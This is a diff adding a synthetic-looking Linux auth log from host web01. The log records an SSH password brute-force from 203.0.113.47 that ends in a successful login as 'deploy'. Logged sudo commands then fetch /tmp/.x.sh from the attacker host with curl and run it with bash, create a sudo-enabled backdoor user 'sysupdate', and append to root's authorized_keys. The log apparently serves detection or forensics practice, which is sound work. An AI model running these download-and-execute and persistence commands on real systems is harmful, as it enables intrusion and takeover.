@@ -1,0 +1,34 @@
+Sep 29 10:17:01 web01 CRON[18101]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 29 10:24:44 web01 sshd[18177]: Accepted publickey for alice from 10.0.5.10 port 52114 ssh2: ED25519 SHA256:Qm9vT2hHbm9QZXJtaXNzaW9u
+Sep 29 10:31:02 web01 sshd[18231]: Failed password for root from 203.0.113.47 port 40231 ssh2
+Sep 29 10:31:09 web01 sshd[18232]: Failed password for root from 203.0.113.47 port 40232 ssh2
+Sep 29 10:31:17 web01 sshd[18233]: Invalid user admin from 203.0.113.47 port 40233
+Sep 29 10:31:17 web01 sshd[18233]: Failed password for invalid user admin from 203.0.113.47 port 40233 ssh2
+Sep 29 10:31:25 web01 sshd[18234]: Invalid user admin from 203.0.113.47 port 40234
+Sep 29 10:31:25 web01 sshd[18234]: Failed password for invalid user admin from 203.0.113.47 port 40234 ssh2
+Sep 29 10:31:38 web01 sshd[18235]: Invalid user oracle from 203.0.113.47 port 40235
+Sep 29 10:31:38 web01 sshd[18235]: Failed password for invalid user oracle from 203.0.113.47 port 40235 ssh2
+Sep 29 10:31:52 web01 sshd[18236]: Failed password for deploy from 203.0.113.47 port 40236 ssh2
+Sep 29 10:32:04 web01 sshd[18237]: Failed password for deploy from 203.0.113.47 port 40237 ssh2
+Sep 29 10:32:19 web01 sshd[18238]: Invalid user ubuntu from 203.0.113.47 port 40238
+Sep 29 10:32:19 web01 sshd[18238]: Failed password for invalid user ubuntu from 203.0.113.47 port 40238 ssh2
+Sep 29 10:32:33 web01 sshd[18239]: Failed password for deploy from 203.0.113.47 port 40239 ssh2
+Sep 29 10:32:48 web01 sshd[18240]: Invalid user git from 203.0.113.47 port 40240
+Sep 29 10:32:48 web01 sshd[18240]: Failed password for invalid user git from 203.0.113.47 port 40240 ssh2
+Sep 29 10:33:02 web01 sshd[18241]: Failed password for deploy from 203.0.113.47 port 40241 ssh2
+Sep 29 10:33:17 web01 sshd[18242]: Failed password for root from 203.0.113.47 port 40242 ssh2
+Sep 29 10:33:29 web01 sshd[18243]: Failed password for deploy from 203.0.113.47 port 40243 ssh2
+Sep 29 10:33:40 web01 sshd[18244]: Failed password for deploy from 203.0.113.47 port 40244 ssh2
+Sep 29 10:34:05 web01 sshd[18260]: Accepted password for deploy from 203.0.113.47 port 40260 ssh2
+Sep 29 10:34:05 web01 sshd[18260]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)
+Sep 29 10:34:05 web01 systemd-logind[712]: New session 214 of user deploy.
+Sep 29 10:35:12 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/curl -s http://203.0.113.47/x.sh -o /tmp/.x.sh
+Sep 29 10:35:12 web01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by deploy(uid=1001)
+Sep 29 10:35:30 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash /tmp/.x.sh
+Sep 29 10:36:01 web01 useradd[18311]: new group: name=sysupdate, GID=1002
+Sep 29 10:36:01 web01 useradd[18311]: new user: name=sysupdate, UID=1002, GID=1002, home=/home/sysupdate, shell=/bin/bash, from=/dev/pts/1
+Sep 29 10:36:03 web01 usermod[18315]: add 'sysupdate' to group 'sudo'
+Sep 29 10:36:03 web01 usermod[18315]: add 'sysupdate' to shadow group 'sudo'
+Sep 29 10:36:40 web01 passwd[18320]: pam_unix(passwd:chauthtok): password changed for sysupdate
+Sep 29 10:37:15 web01 sudo:   deploy : TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys
+Sep 29 10:48:22 web01 sshd[18260]: pam_unix(sshd:session): session closed for user deploy
